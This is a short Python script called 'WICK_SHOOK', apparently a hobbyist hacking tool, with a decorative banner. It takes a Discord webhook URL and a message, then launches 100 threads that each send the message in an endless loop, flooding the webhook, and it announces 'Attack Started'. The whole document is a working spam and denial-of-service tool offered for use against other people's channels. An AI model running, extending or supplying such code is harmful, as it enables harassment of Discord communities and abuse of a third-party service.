from dhooks import Webhook
from threading import Thread
from colorama import Fore , init
from os import system , name
from pystyle import Colorate , Colors

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

banner = '''
        █     █░ ██▓ ▄████▄   ██ ▄█▀     ██████  ██░ ██  ▒█████   ▒█████   ██ ▄█▀
        ▓█░ █ ░█░▓██▒▒██▀ ▀█   ██▄█▒    ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
        ▒█░ █ ░█ ▒██▒▒▓█    ▄ ▓███▄░    ░ ▓██▄   ▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░ 
        ░█░ █ ░█ ░██░▒▓▓▄ ▄██▒▓██ █▄      ▒   ██▒░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ 
        ░░██▒██▓ ░██░▒ ▓███▀ ░▒██▒ █▄   ▒██████▒▒░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
        ░ ▓░▒ ▒  ░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
        ▒ ░ ░   ▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
        ░   ░   ▒ ░░        ░ ░░ ░    ░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
            ░     ░  ░ ░      ░  ░            ░   ░  ░  ░    ░ ░      ░ ░  ░  ░   
             ░                                                            

         ╚╦═══════════════════════════════════════════════════════════════════╦╝
    ╔═════╩═══════════════════════════════════════════════════════════════════╩═════╗

              *** Created By JOHN WICK --- Team Pytho Learn ᴿᶻ ʟᴀᴛᴀʀʏ ***

    ╚═══════════════════════════════════════════════════════════════════════════════╝
'''

try:
    system('title [+] * WICK_SHOOK Created By JOHN WICK --- Team Pytho Learn ᴿᶻ ʟᴀᴛᴀʀʏ--- * [+] || echo -e "\e]0;[+] * WICK_SHOOK Created By JOHN WICK --- Team Pytho Learn ᴿᶻ ʟᴀᴛᴀʀʏ--- * [+]\a"')
    system('cls' if name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_blue,banner,1))
except:
    pass

message = input(f"\n  {cyan}[{green}+{cyan}] {yellow}Enter Message {red}:{green} ")
webhookurl = Webhook(input(f"  {cyan}[{green}+{cyan}] {blue}Enter Webhook {red}:{green} "))

def main():
    while True:
        try:
            for _ in range(200):
                webhookurl.send(message)
        except:
            pass

print(f'\n  {red}[{yellow}+{red}]{green} Attack Started')

for i in range(100):
    Thread(target=main).start()
